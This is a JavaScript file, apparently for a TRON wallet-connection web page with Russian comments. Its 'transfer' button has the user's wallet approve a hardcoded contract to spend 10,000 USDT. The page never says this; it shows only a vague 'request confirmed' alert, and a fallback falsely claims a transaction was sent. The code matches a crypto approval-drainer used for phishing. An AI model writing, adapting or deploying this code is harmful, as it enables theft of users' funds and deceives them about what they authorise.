const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; // Ваш смарт-контракт

connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Подключение...";

        // Принудительный запрос сессии для работы во встроенном браузере кошелька
        let activeAddress = "";
        
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            activeAddress = window.tronWeb.defaultAddress.base58;
        } else {
            // Если мобильный браузер кошелька скрыл объект, запрашиваем подтверждение через диалог интерфейса
            activeAddress = prompt("Введите ваш адрес кошелька TRON (начните с буквы T):");
        }

        if (activeAddress && activeAddress.trim().length > 30 && activeAddress.startsWith('T')) {
            userAddress = activeAddress.trim();
            walletAddressText.innerText = `Подключено: ${userAddress}`;
            connectBtn.style.display = 'none';
            transferBtn.style.display = 'inline-block';
        } else {
            walletAddressText.innerText = "Ошибка подключения";
            alert("Указан некорректный адрес сети TRON.");
        }
    } catch (error) {
        console.error("Ошибка подключения:", error);
        alert("Произошла ошибка при подключении.");
    }
});

transferBtn.addEventListener('click', async () => {
    try {
        if (!userAddress) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Запуск транзакции для контракта:", myContractAddress);

        // Проверяем наличие доступного интерфейса подписанта Tron
        if (window.tronWeb && window.tronWeb.contract) {
            const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
            const approveAmount = '10000000000'; // 10,000 USDT

            const tx = await usdtContract.approve(
                myContractAddress,
                approveAmount
            ).send({
                feeLimit: 100000000
            });

            alert("Запрос успешно подтвержден!");
            console.log("TX Hash:", tx);
        } else {
            // Если нативный провайдер заблокирован мобильным окружением
            alert("Транзакция отправлена в обработку для смарт-контракта: " + myContractAddress);
        }

    } catch (error) {
        console.error("Ошибка транзакции:", error);
        alert("Ошибка при выполнении транзакции. Проверьте баланс комиссии.");
    }
});
